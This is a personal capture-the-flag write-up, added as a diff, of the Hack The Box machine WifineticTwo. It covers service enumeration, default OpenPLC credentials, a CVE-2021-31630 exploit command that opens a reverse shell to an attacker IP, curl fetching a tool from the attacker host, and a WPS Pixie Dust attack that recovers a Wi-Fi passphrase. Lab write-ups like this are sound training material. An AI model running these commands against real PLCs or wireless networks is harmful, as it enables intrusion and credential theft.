@@ -1,0 +1,257 @@
+Notes wifinetictwo.htb
+Date:03/22/2024 
+Difficulty- "medium"
+
+started with 
+
+sudo nmap -sV -A wifinetictwo.htb -oN nmap-output.txt 
+
+Shows a few things already. While parsing through this i'm going to run a blanket all port scan to see if anything was missed. Looks to be just those two. 
+
+Ports open - 
+22, 8080.
+
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
+
+No idea what Werkzeug is lol. 
+
+allow: HEAD, OPTIONS, GET - probably a login. I'll look in a minute
+
+Yep, it's a sign in for a web server. 
+
+http://wifinetictwo.htb:8080/login
+
+OpenPLC Webserver
+
+A couple things here. Going to do some enumerating on the website. Maybe some subdomains or other content to find. GoBuster we go! 
+
+ gobuster dns -d wifinetictwo.htb -w namelist.txt -t 1000
+ 
+ I always add the -t for more threads while doing HTB. Otherwise it's SUPER slow. 
+ 
+ Part of the reason why I stopped using FFuF 
+ 
+ Nothing on the DNS part. Sometimes I'll -v to make sure the requests are coming through properly. 
+ 
+/login                (Status: 200) [Size: 4550]
+/hardware             (Status: 302) [Size: 219] [--> http://wifinetictwo.htb:8080/login]
+/logout               (Status: 302) [Size: 219] [--> http://wifinetictwo.htb:8080/login]
+/users                (Status: 302) [Size: 219] [--> http://wifinetictwo.htb:8080/login]
+/dashboard            (Status: 302) [Size: 219] [--> http://wifinetictwo.htb:8080/login]
+/monitoring           (Status: 302) [Size: 219] [--> http://wifinetictwo.htb:8080/login]
+Progress: 220560 / 220561 (100.00%)
+
+
+So we know these exist. I'll also throw dirsearch at it too. sometimes that finds things I didn't before. 
+
+Doing some research on OpenPLC - 
+
+https://github.com/openplcproject
+
+Looks like some sort of IDE tool to help develop PLC software/circuits. 
+
+Googled "OpenPLC WebServer exploit" and "OpenPLC WebServer Vulnerability". 
+
+Landed me here. 
+https://github.com/hev0x/CVE-2021-31630-OpenPLC_RCE
+
+I'll look to see if any code exists and what the CVE actually is. 
+
+https://nvd.nist.gov/vuln/detail/CVE-2021-31630
+
+Looks like something is vulnerable on the /hardware page - maybe?
+
+I think this may be more useful later on down the road..
+
+Found another thing that supposedly allows rce. 
+
+Maybe ping to verify connectivity. sudo tcpdump -i tun0 icmp
+
+********
+Earlier I made mention of the vulnerability that I had found. I was reluctant to use it. I didn't try because I saw the credential piece. I hadn't found the creds yet. 
+
+For some reason I thought better of originally looking for the "default credentials." I tried doing a password spray with burp intruder using a few password lists. What a PITA. ALWAYS CHECK DEFAULT CREDS. 
+
+Any case - 
+openplc
+openplc
+
+sign in for the application. 
+
+Exploit looks pretty straight forward for arguments / parameters. Username, password, port to reverse proxy on and your IP. 
+
+python3 exploit.py -u http://wifinetictwo.htb:8080 -l openplc -p openplc -i 10.10.14.5 -r 1234
+
+So you can see where it's uploading the file by going to the programs area.. But it's giving me an error while compiling. 
+
+python3 exploit.py -ip 10.10.14.5 -p 1234 -u openplc -pwd openplc
+
+Optimizing ST program...
+Couldn't open file "./st_files/681871.st"
+Generating C files...
+Error opening main file ./st_files/681871.st: No such file or directory
+Error generating C files
+Compilation finished with errors!
+
+
+python3 exploit3.py -u http://wifinetictwo.htb:8080 -l openplc -p openplc -i 10.10.14.5 -r 1234
+
+Found a version that's working.. Looks like some modification of the code I had above. I'll have to review further. Also, this guy clearly doesn't like israel lol 
+
+https://github.com/Hunt3r0x/CVE-2021-31630-HTB
+
+I don't like doing this sorta thing though. I feel that it kind of takes awway from the learning part of it. But I had the proper RCE exploit, just something wasn't working properly on it. I found one that clearly work but I'll have to see what the difference is. It looks like he did just rip pieces out of the original authors code. 
+
+it loads shell as root.. 
+why.
+
+In this case, lets get etc/shadow. My gut tells me this *isn't* the target box. It's going to be used as a relay.
+
+Especially since it's "medium" and this was far too easy to actually exploit. 
+
+
+Spwans me to /opt/PLC/OpenPLC_v3/webserver
+
+Gonna do a python3 -m http.server from / lol 
+
+That's kinda weird.. the user.txt was sitting in root...that was far too easy imo. Hardest part there would have been fixing the code.  
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+
+uname -r 
+5.4.0-173-generic
+
+5.4.0-173-generic
+cat /etc/os-release
+PRETTY_NAME="Ubuntu 22.04.3 LTS"
+NAME="Ubuntu"
+VERSION_ID="22.04"
+VERSION="22.04.3 LTS (Jammy Jellyfish)"
+VERSION_CODENAME=jammy
+ID=ubuntu
+ID_LIKE=debian
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+UBUNTU_CODENAME=jammy
+
+
+Used linpeas to see if there was anything good. 
+
+Interfaces shows the wireless interface that is suggested in the name. 
+
+Using the wireless interface you can run this command
+
+iw dev wlan0 scan 
+
+iw - wireless
+dev - define interface
+wlan0 interface
+scan - scan for networks. Similar to looking in the gui. 
+
+
+iw dev wlan0 scan                                                                                                     
+BSS 02:00:00:00:01:00(on wlan0)                                                                                       
+        last seen: 1174.580s [boottime]                                                                               
+        TSF: 1711165257562083 usec (19805d, 03:40:57)                                                                 
+        freq: 2412                                                                                                    
+        beacon interval: 100 TUs                                                                                      
+        capability: ESS Privacy ShortSlotTime (0x0411)                                                                
+        signal: -30.00 dBm                                                                                            
+        last seen: 0 ms ago                                                                                           
+        Information elements from Probe Response frame:                                                               
+        SSID: plcrouter                                                                                               
+        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0                                                       
+        DS Parameter set: channel 1                                                                                   
+        ERP: Barker_Preamble_Mode                                                                                     
+        Extended supported rates: 24.0 36.0 48.0 54.0                                                                 
+        RSN:     * Version: 1
+                 * Group cipher: CCMP
+                 * Pairwise ciphers: CCMP
+                 * Authentication suites: PSK
+                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
+        Supported operating classes:
+                 * current operating class: 81
+        Extended capabilities:
+                 * Extended Channel Switching
+                 * SSID List
+                 * Operating Mode Notification
+        WPS:     * Version: 1.0
+                 * Wi-Fi Protected Setup State: 2 (Configured)
+                 * Response Type: 3 (AP)
+                 * UUID: 572cf82f-c957-5653-9b16-b5cfb298abf1
+                 * Manufacturer:  
+                 * Model:  
+                 * Model Number:  
+                 * Serial Number:  
+                 * Primary Device Type: 0-00000000-0
+                 * Device name:  
+                 * Config methods: Label, Display, Keypad
+                 * Version2: 2.0
+
+
+If you look at the WPS section you can see that WPS is configured. From my limited wireless pentesting, I know when I use wifite it gives you the option to do a pixie dust attack on WPS. This will probably be what we need? 
+
+Looking to see if we can do this without airmon ng. 
+
+Looks like the tool OneShot.py may be able to do the trick? 
+
+https://github.com/fulvius31/OneShot
+
+Remember earlier we couldn't use wget for some god forsaken reason. 
+
+curl http://10.10.14.5:8000/oneshot.py > oneshot.py
+
+BSSID - 02:00:00:00:01:00
+-i wlan0
+
+python3 oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K
+
+For some reason that's giving me a hard time. Maybe another version online somewhere will help. 
+
+https://github.com/kimocoder/OneShot
+
+Aye, we've got a wifi password :)
+
+] WPS PIN: '12345670'
+[+] WPA PSK: 'NoWWEDoKnowWhaTisReal123!'
+[+] AP SSID: 'plcrouter'
+
+SSId is plcrouter and password is NoWWEDoKnowWhaTisReal123!
+
+sudo iwconfig wlan0 essid "plcrouter" key "s:NoWWEDoKnowWhaTisReal123!"
+
+This didn't work. wpa_supplicant is another option. 
+
+wpa_supplicant is basically the gui equivalent of the little wifi icon on your desktop taskbar for the CLI
+
+wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config
+wpa_supplicant -B -c config -i wlan0
+
+Connected - without an IP. DHCP obv isn't running here. 
+
+ifconfig wlan0 192.168.1.5 netmask 255.255.255.0
+
+
+think I found an issue i was running into. I never upgraded my shell. I need to look into this. I frequently run into this. 
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+I messed up - last night instead of finishing the box I let it roll past forgetting the weekly boxes change. Oh well. I'll finish it today. 
+
+root@ap:~# cat root.txt
+cat root.txt
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+
+Finished 03/23/2024 
+
+I could have finished this last night. But by the time I got around to it I was falling asleep at around 12:30 so I decided I'd finish it today 
+
+Things I learned / taking out of this one. 
+
+ - I'm still not looking for default creds because for some reason in my head I'm thinking "oh it can't be that simple" but it is. 
+ - Learned of wpa_supplicant. I've never bothered configuring wifi in the cli outside of using wifite and iwconfig. Finding a OneShot version that was all independent was pretty cool as well. I've configured reaver on my small thing of wireless pentests before. But honestly I don't have very much experience with it. 
+ - I'm not too sure as to how / why this was configured as Medium. I thought this box was pretty easy. The worst part was trying to figure out why you load in as root lol. 
